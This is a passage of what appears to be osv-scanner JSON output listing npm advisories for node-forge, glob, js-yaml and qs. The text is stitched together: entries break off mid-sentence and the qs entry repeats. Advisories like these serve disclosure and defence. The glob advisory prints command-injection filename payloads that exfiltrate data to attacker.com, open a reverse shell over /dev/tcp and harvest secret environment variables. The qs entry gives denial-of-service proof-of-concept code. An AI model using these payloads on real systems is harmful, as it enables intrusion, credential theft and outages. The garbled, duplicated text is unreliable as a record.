ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.","references":[{"type":"WEB","url":"https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/pull/1124"},{"type":"PACKAGE","url":"https://github.com/digitalbazaar/forge"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667"},{"type":"WEB","url":"https://kb.cert.org/vuls/id/521113"},{"type":"WEB","url":"https://www.kb.cert.org/vuls/id/521113"},{"type":"WEB","url":"https://www.npmjs.com/package/node-forge"}],"aliases":["CVE-2025-12816"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-14T00:56:16.341Z"}},{"id":"GHSA-65ch-62r8-g69g@node-forge-1.3.1","package":{"name":"node-forge","version":"1.3.1","ecosystem":"npm","purl":"pkg:npm/node-forge"},"severity":{"level":"moderate","type":"CVSS_V4","vector":"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"},"affectedVersions":{"ranges":[{"introduced":"0","fixed":"1.3.2"}]},"fix":{"available":true,"version":"1.3.2"},"details":{"title":"node-forge is vulnerable to ASN.1 OID Integer Truncation","description":"### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs.

When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","references":[{"type":"WEB","url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-glob"}],"aliases":["CVE-2025-64756"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-14T00:56:16.343Z"}},{"id":"GHSA-mh29-5h37-fv8m@js-yaml-4.1.0","package":{"name":"js-yaml","version":"4.1.0","ecosystem":"npm","purl":"pkg:npm/js-yaml"},"severity":{"level":"moderate","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"},"affectedVersions":{"ranges":[{"introduced":"4.0.0","fixed":"4.1.1"}]},"fix":{"available":true,"version":"4.1.1"},"details":{"title":"js-yaml has prototype pollution in merge (<<)","description":"### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`).

Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1.

Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler.
